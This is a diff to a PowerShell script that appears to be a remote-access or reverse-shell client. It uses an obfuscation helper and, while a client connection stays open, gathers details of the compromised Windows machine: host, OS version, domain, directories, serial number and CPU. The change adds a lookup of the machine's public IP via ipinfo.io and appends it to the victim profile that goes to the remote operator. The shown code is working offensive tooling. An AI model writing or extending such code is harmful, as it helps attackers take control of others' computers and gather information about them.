@@ -360,8 +360,9 @@ $WindowsDirectory = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem)
 $serial = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem).SerialNumber");
 $syst_dir = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem).SystemDirectory");
 $Processor = Character_Obfuscation("(Get-WmiObject Win32_processor).Caption");
+$PublicIP = ("(curl http://ipinfo.io/ip).content");
 
-$Command = "`"`n   Host          : `"+`"$Remote_Host`"+`"``n   System        : `"+$System+`"``n   Version       : `"+$Version+`"``n   Architecture  : `"+$Architecture+`"``n   DomainName    : `"+$Name+`"``n   WindowsDir    : `"+$WindowsDirectory+`"``n   SystemDir     : `"+$syst_dir+`"``n   SerialNumber  : `"+$serial+`"``n   ProcessorCPU  : `"+$Processor";
+$Command = "`"`n   Host          : `"+`"$Remote_Host`"+`"``n   System        : `"+$System+`"``n   Version       : `"+$Version+`"``n   Architecture  : `"+$Architecture+`"``n   DomainName    : `"+$Name+`"``n   WindowsDir    : `"+$WindowsDirectory+`"``n   SystemDir     : `"+$syst_dir+`"``n   SerialNumber  : `"+$serial+`"``n   ProcessorCPU  : `"+$Processor+`"``n   Public IP     : `"+$PublicIP";
 
 
 While($Client.Connected)
